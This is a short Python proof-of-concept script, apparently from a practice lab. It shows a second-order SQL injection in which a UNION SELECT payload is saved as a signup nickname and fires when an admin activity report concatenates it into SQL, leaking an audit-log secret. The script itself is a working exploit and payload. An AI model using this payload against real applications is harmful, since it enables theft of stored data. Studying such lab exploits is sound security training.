"""L04 second-order SQL injection PoC.

Sign-up stores the nickname with a parameterized query (safe in isolation).
The admin activity report later concatenates that stored nickname into SQL,
so the payload fires when an admin views the report.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _common import load_level, ok

mod, _, _ = load_level("L04")
mod.db.init()
client = mod.app.test_client()

payload = "z' UNION SELECT note FROM audit_log ORDER BY 1 DESC-- "
ok(len(payload) <= 60, f"payload fits nickname length cap ({len(payload)} chars)")

r = client.post(
    "/signup", json={"email": "attacker@example.com", "nickname": payload}
).get_json()
uid = r["id"]

# admin opens the per-user activity report -> stored payload executes
rep = client.get("/admin/activity", query_string={"uid": uid}).get_json()
mentions = str(rep.get("mentions"))
ok("KQ19Z" in mentions, f"second-order injection leaked audit secret: {mentions!r}")
print("L04 exploit confirmed")
